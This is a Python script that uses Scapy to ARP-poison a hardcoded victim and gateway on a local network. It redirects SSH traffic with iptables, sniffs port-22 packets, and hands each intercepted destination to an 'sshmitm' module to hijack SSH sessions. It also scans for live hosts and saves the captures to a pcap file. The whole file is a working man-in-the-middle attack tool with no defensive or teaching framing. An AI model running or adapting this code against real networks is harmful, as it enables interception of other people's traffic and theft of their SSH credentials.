from scapy.all import *
from socket import *
import os
import sys
import threading
import sshmitm


class ARPObj(object):
    """The main class for the ARP Spoofer"""
    def __init__(self, **kwargs):
        super(ARPObj, self).__init__()
        self._arg = kwargs

    @property
    def gateway_ip(self):
        return self._arg.get('gateway_ip', None)

    @gateway_ip.setter
    def gateway_ip(self, g_ip):
        self._arg['gateway_ip'] = g_ip

    @gateway_ip.deleter
    def gateway_ip(self):
        del self._arg['gateway_ip']

    @property
    def gateway_mac(self):
        return self._arg.get('gateway_mac', None)

    @gateway_mac.setter
    def gateway_mac(self, g_mac):
        self._arg['gateway_mac'] = g_mac

    @gateway_mac.deleter
    def gateway_mac(self):
        del self._arg['gateway_mac']

    @property
    def target_ip(self):
        return self._arg.get('target_ip', None)

    @target_ip.setter
    def target_ip(self, t_ip):
        self._arg['target_ip'] = t_ip

    @target_ip.deleter
    def target_ip(self):
        del self._arg['target_ip']

    @property
    def target_mac(self):
        return self._arg.get('target_mac', None)

    @target_mac.setter
    def target_mac(self, t_mac):
        self._arg['target_mac'] = t_mac

    @target_mac.deleter
    def target_mac(self):
        del self._arg['target_mac']

    def restore_target(self):

        print "[*] Restoring target..."
        disable_ssh_redirection()
        send(ARP(op=2, psrc=self._arg['gateway_ip'],
                 pdst=self._arg['target_ip'], hwdst="ff:ff:ff:ff:ff:ff",
                 hwsrc=self._arg['gateway_mac']), count=5)
        send(ARP(op=2, psrc=self._arg['target_ip'],
                 pdst=self._arg['gateway_ip'], hwdst="ff:ff:ff:ff:ff:ff",
                 hwsrc=self._arg['target_mac']), count=5)

    def poison_target(self):
        global poisoning
        enable_ssh_redirection()
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self._arg['gateway_ip']
        poison_target.pdst = self._arg['target_ip']
        poison_target.hwdst = self._arg['target_mac']

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self._arg['target_ip']
        poison_gateway.pdst = self._arg['gateway_ip']
        poison_gateway.hwdst = self._arg['gateway_mac']

        print "[*] Beginning the ARP poison. [CTRL-C to stop]"

        while poisoning:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)

        print "[*] ARP poison attack finished."

        return


def get_mac(ip_address):

        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
        for s, r in responses:
            return r[Ether].src

        return None


def run(network):
    print ''
    for ip in xrange(1, 256):
        addr = network + str(ip)
        if is_up(addr):
            print '%s \t- %s' % (addr, getfqdn(addr))
    print


def is_up(addr):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(0.01)
    if not s.connect_ex((addr, 135)):
        s.close()
        return 1
    else:
        s.close()

poisoning = True


def enable_ssh_redirection():

    print ('[*] Redirecting all ssh traffic to port 2200')

    os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 22 -j REDIRECT --to-port 2200')


# restore iptables to default state
def disable_ssh_redirection():

    print ('[*] Disabling ssh redirection')

    os.system('iptables -v --flush')
    os.system('iptables -v --table nat --flush')
    os.system('iptables -v --delete-chain')
    os.system('iptables -v --table nat --delete-chain')


def customAction(packet):
    if packet[0][1].dst[0:3] != '172':
        sshmitm.DOMAIN = packet[0][1].dst
        print sshmitm.DOMAIN
        sshmitm.launcher()
    return "Packet #%s" % (packet[0][1].dst)


def main():

    ARP_Obj = ARPObj()
    interface = "eth0"
    ARP_Obj.target_ip = "172.27.5.189"
    ARP_Obj.gateway_ip = "172.27.0.1"
    packet_count = 100

    conf.iface = interface

    # turn off output
    conf.verb = 0

    print "[*] Setting up %s" % interface

    ARP_Obj.gateway_mac = get_mac(ARP_Obj.gateway_ip)

    if ARP_Obj.gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (ARP_Obj.gateway_ip, ARP_Obj.gateway_mac)

    ARP_Obj.target_mac = get_mac(ARP_Obj.target_ip)

    if ARP_Obj.target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (ARP_Obj.target_ip, ARP_Obj.target_mac)

    # start poison thread
    poison_thread = threading.Thread(target=ARP_Obj.poison_target)
    poison_thread.start()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s and port 22" % ARP_Obj.target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface, prn=customAction)

    except KeyboardInterrupt:
        pass

    finally:
        # write out the captured packets
        print "[*] Writing packets to arper.pcap"
        wrpcap('arper.pcap', packets)
        global poisoning
        poisoning = False
        time.sleep(2)
        ARP_Obj.restore_target()
        sys.exit(0)

if __name__ == '__main__':
    main()
